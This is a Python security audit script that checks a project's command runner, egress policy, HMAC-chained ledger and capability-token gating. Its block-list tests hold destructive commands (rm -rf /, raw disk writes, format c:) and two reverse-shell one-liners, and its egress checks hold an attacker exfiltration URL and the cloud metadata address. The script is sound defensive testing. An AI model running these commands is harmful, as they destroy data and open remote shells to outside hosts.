"""Independent Forensic Stress-Test & Attack Surface Probe for Milestone M2.

Auditor: auditor_m2_1
Target: Milestone M2 (F07, F08 & F14, F09)
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import os
import shutil
import sys
import tempfile
import time
from pathlib import Path

os.environ.setdefault(
    "SCP_CAPABILITY_SECRET",
    "test-capability-secret-for-automated-suites-only-32bytes",
)

PROJECT_ROOT = Path("D:/scp")
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scp.capabilities.tools import SafeCommandRunnerTool, SystemInspectionTool, WorkspaceAnalysisTool
from scp.policy.egress import EgressPolicy, EgressDeniedError, EgressMode, EgressDestination
from scp.security.url_safety import safe_urlopen, enforce_egress_policy, _PinnedHTTPConnection, _PinnedHTTPSConnection
from scp.core.autonomous_ledger import AutonomousAuditLedger, ProvenanceBlock
from scp.hands.action_registry import ActionRegistry
from scp.hands.hands_executor import HandsExecutor
from scp.security.capability_epoch import CapabilityAuthority, CapabilityToken
from scp.security.autonomous_governor import AutonomousCapabilityGovernor


def run_checks():
    report = {
        "timestamp": time.time(),
        "checks": [],
        "all_passed": True,
    }

    def record_check(name: str, passed: bool, details: str):
        report["checks"].append({"name": name, "passed": passed, "details": details})
        if not passed:
            report["all_passed"] = False
        print(f"[{'PASS' if passed else 'FAIL'}] {name}: {details}")

    # =========================================================================
    # CHECK 1: SafeCommandRunnerTool Authenticity & Adversarial Bypass Attempts
    # =========================================================================
    temp_dir = Path(tempfile.mkdtemp(prefix="auditor_m2_test_"))
    try:
        runner = SafeCommandRunnerTool(working_dir=temp_dir)

        # 1.1 Blocked commands with tricks
        tricky_blocked = [
            ("rm -rf /", "standard blocked"),
            ("rm   -rf   /", "spaced blocked"),
            ("rm\\ -rf\\ /", "backslash blocked"),
            ('rm"-rf" /', "quoted blocked"),
            ("chmod -R 777 /", "chmod 777 recursive"),
            ("chmod -r 777 /", "chmod 777 lowercase r"),
            ("chown -R root /", "chown recursive"),
            ("nc -e /bin/sh 1.2.3.4 4444", "nc -e reverse shell"),
            ("bash -i >& /dev/tcp/1.2.3.4/8080 0>&1", "bash reverse shell"),
            ("cat /dev/zero > /dev/sda", "raw device write"),
            ("format c:", "format command"),
            ("shutdown /s /t 0", "shutdown command"),
        ]
        all_tricky_blocked = True
        for cmd, desc in tricky_blocked:
            allowed, reason, _ = runner.evaluate_command(cmd, capability_level=3, approved=True)
            if allowed:
                all_tricky_blocked = False
                record_check(f"SafeCommandRunner: {desc}", False, f"Bypass succeeded! Allowed: {cmd}")
                break
        if all_tricky_blocked:
            record_check("SafeCommandRunner: Adversarial Blocked Invariants", True, f"All {len(tricky_blocked)} destructive commands blocked.")

        # 1.2 Redirection and chaining
        chaining_cmds = [
            "git status; ls",
            "git status && ls",
            "dir || echo hacked",
            "echo 1 > out.txt",
            "echo 1 >> out.txt",
            "type < in.txt",
            "echo `whoami`",
            "echo $(whoami)",
            "echo ${USER}",
        ]
        all_chaining_blocked = True
        for cmd in chaining_cmds:
            allowed, reason, _ = runner.evaluate_command(cmd, capability_level=3, approved=True)
            if allowed:
                all_chaining_blocked = False
                record_check("SafeCommandRunner: Chaining/Redirection", False, f"Bypass allowed: {cmd}")
                break
        if all_chaining_blocked:
            record_check("SafeCommandRunner: Chaining & Redirection", True, f"All {len(chaining_cmds)} chaining/redirection vectors blocked.")

        # 1.3 Execution authenticity: verify actual execution and stdout capture
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            token_str = f"forensic_token_{int(time.time()*1000)}"
            exec_res = loop.run_until_complete(runner.run({
                "command": f"echo {token_str}",
                "capability_level": 1,
            }))
            real_exec_passed = (
                exec_res.success is True
                and token_str in exec_res.data.get("stdout", "")
                and exec_res.data.get("returncode") == 0
                and "stdout_sha256" in exec_res.evidence
            )
            record_check(
                "SafeCommandRunner: Real Execution Authenticity",
                real_exec_passed,
                f"Real subprocess returned stdout containing token: {token_str}",
            )
        finally:
            loop.close()

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

    # =========================================================================
    # CHECK 2: EgressPolicy & Fail-Closed Enforcement (F08, F14)
    # =========================================================================
    # 2.1 Default mode unset -> must be allowlist (loopback only)
    old_mode = os.environ.get("SCP_EGRESS_MODE")
    old_allowlist = os.environ.get("SCP_EGRESS_ALLOWLIST")
    try:
        if "SCP_EGRESS_MODE" in os.environ:
            del os.environ["SCP_EGRESS_MODE"]
        if "SCP_EGRESS_ALLOWLIST" in os.environ:
            del os.environ["SCP_EGRESS_ALLOWLIST"]

        default_policy = EgressPolicy()
        mode_is_allowlist = default_policy.mode == EgressMode.ALLOWLIST

        # Loopback permitted
        default_policy.enforce("http://127.0.0.1:8000/health")
        default_policy.enforce("http://[::1]:8081/health")
        default_policy.enforce("http://localhost:3000/")

        # External denied
        blocked_ext = False
        try:
            default_policy.enforce("https://evil.attacker.com/leak")
        except EgressDeniedError:
            blocked_ext = True

        # Cloud metadata denied unconditionally
        blocked_meta = False
        try:
            default_policy.enforce("http://169.254.169.254/latest/meta-data")
        except EgressDeniedError:
            blocked_meta = True

        # IPv6 mapped metadata denied
        blocked_ipv6_meta = False
        try:
            default_policy.enforce("http://[::ffff:169.254.169.254]/latest/meta-data")
        except (EgressDeniedError, ValueError):
            blocked_ipv6_meta = True

        record_check(
            "EgressPolicy: Fail-Closed Default & Invariants",
            mode_is_allowlist and blocked_ext and blocked_meta and blocked_ipv6_meta,
            f"Mode={default_policy.mode}, ext_blocked={blocked_ext}, meta_blocked={blocked_meta}, ipv6_meta_blocked={blocked_ipv6_meta}",
        )
    finally:
        if old_mode is not None:
            os.environ["SCP_EGRESS_MODE"] = old_mode
        if old_allowlist is not None:
            os.environ["SCP_EGRESS_ALLOWLIST"] = old_allowlist

    # =========================================================================
    # CHECK 3: AutonomousAuditLedger HMAC Tamper Detection & 2PC (F09)
    # =========================================================================
    temp_dir2 = Path(tempfile.mkdtemp(prefix="auditor_m2_ledger_"))
    try:
        ledger_path = temp_dir2 / "test_ledger.jsonl"
        hmac_key = "test_hmac_secret_key_32_bytes_len"
        ledger = AutonomousAuditLedger(ledger_path=ledger_path, hmac_key=hmac_key)

        intent = ledger.commit_intent(
            task_id="audit_task_1",
            step_id="step_1",
            tool_name="cmd.run",
            params={"command": "echo test"},
            capability_token={"token_id": "tok_123", "signature": "sig_abc"},
        )
        result = ledger.commit_result(
            task_id="audit_task_1",
            step_id="step_1",
            tool_name="cmd.run",
            intent_entry_hash=intent["hash"],
            result_data={"success": True, "output": "test"},
            evidence={"sha256": "dummy"},
            status="SUCCESS",
            duration_ms=10.5,
        )

        # 3.1 Pristine verification
        v_pristine = ledger.verify_provenance()
        record_check(
            "AutonomousAuditLedger: Pristine HMAC Verification",
            v_pristine["hash_chain_valid"] is True and v_pristine["entries"] == 2,
            f"Valid={v_pristine['hash_chain_valid']}, entries={v_pristine['entries']}, errors={v_pristine['errors']}",
        )

        # 3.2 Tamper attack: modify payload and recalculate bare SHA-256 hash
        lines = ledger_path.read_text(encoding="utf-8").splitlines()
        e0 = json.loads(lines[0])
        e0["fields"]["tool_name"] = "cmd.tampered_rm"
        body = {k: v for k, v in e0.items() if k != "hash"}
        e0["hash"] = "sha256:" + hashlib.sha256(json.dumps(body, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
        lines[0] = json.dumps(e0, sort_keys=True)
        ledger_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

        v_tampered = ledger.verify_provenance()
        tamper_detected = (
            v_tampered["hash_chain_valid"] is False
            and any("hmac_intent:1" in err for err in v_tampered["errors"])
        )
        record_check(
            "AutonomousAuditLedger: Recalculated Hash Tamper Detection",
            tamper_detected,
            f"Tamper detected: {v_tampered['errors']}",
        )

    finally:
        shutil.rmtree(temp_dir2, ignore_errors=True)

    # =========================================================================
    # CHECK 4: HandsExecutor Two-Phase Commit & Capability PEP Wiring
    # =========================================================================
    temp_dir3 = Path(tempfile.mkdtemp(prefix="auditor_m2_hands_"))
    try:
        cap_auth = CapabilityAuthority(temp_dir3 / "cap_state.json")
        executor = HandsExecutor(data_dir=temp_dir3 / "hands_data", capability_authority=cap_auth)

        loop2 = asyncio.new_event_loop()
        asyncio.set_event_loop(loop2)
        try:
            # 4.1 Missing token -> blocked
            res_no_tok = loop2.run_until_complete(executor.execute("cmd.run", params={"command": "echo bad"}))
            no_tok_blocked = res_no_tok.get("success") is False and res_no_tok.get("verification", {}).get("passed") is False

            # 4.2 Valid token -> executed with 2PC
            token = cap_auth.issue("hands:cmd.run")
            res_valid = loop2.run_until_complete(executor.execute(
                "cmd.run",
                params={"command": "echo hands_2pc_verified"},
                capability_level=1,
                approved=False,
                capability_token=token,
            ))
            valid_executed = (
                res_valid.get("success") is True
                and "intentHash" in res_valid
                and "outcomeHash" in res_valid
                and res_valid.get("ledgerSeq", 0) > 0
                and "hands_2pc_verified" in res_valid.get("data", {}).get("stdout", "")
            )

            # Check ledger provenance
            v_hands = executor.audit_ledger.verify_provenance()
            hands_ledger_valid = v_hands["hash_chain_valid"] is True and v_hands["entries"] >= 2

            record_check(
                "HandsExecutor: Capability PEP & Two-Phase Commit",
                no_tok_blocked and valid_executed and hands_ledger_valid,
                f"NoTokenBlocked={no_tok_blocked}, ValidExec={valid_executed}, LedgerEntries={v_hands['entries']}",
            )
        finally:
            loop2.close()

    finally:
        shutil.rmtree(temp_dir3, ignore_errors=True)

    # =========================================================================
    # CHECK 5: Production Caller Grep Verification
    # =========================================================================
    import glob
    callers = {
        "tools": [],
        "egress": [],
        "autonomous_ledger": [],
    }
    for p in glob.glob("scp/**/*.py", recursive=True):
        p_norm = p.replace("\\", "/")
        with open(p, encoding="utf-8", errors="ignore") as f:
            for line_no, line in enumerate(f, 1):
                if "from scp.capabilities.tools import" in line:
                    callers["tools"].append(f"{p_norm}:{line_no}")
                if "from scp.policy.egress import" in line:
                    callers["egress"].append(f"{p_norm}:{line_no}")
                if "from scp.core.autonomous_ledger import" in line:
                    callers["autonomous_ledger"].append(f"{p_norm}:{line_no}")

    callers_verified = (
        len(callers["tools"]) >= 3
        and len(callers["egress"]) >= 3
        and len(callers["autonomous_ledger"]) >= 1
    )
    record_check(
        "Production Callers: Grep Verification",
        callers_verified,
        f"tools callers={len(callers['tools'])}, egress callers={len(callers['egress'])}, ledger callers={len(callers['autonomous_ledger'])}",
    )

    print("\n--- FINAL STRESS TEST SUMMARY ---")
    print(f"Total Checks: {len(report['checks'])}, All Passed: {report['all_passed']}")
    return report


if __name__ == "__main__":
    report = run_checks()
    out_file = Path("D:/scp/.agents/auditor_m2_1/adversarial_stress_report.json")
    out_file.write_text(json.dumps(report, indent=2), encoding="utf-8")
    print(f"Report written to {out_file}")
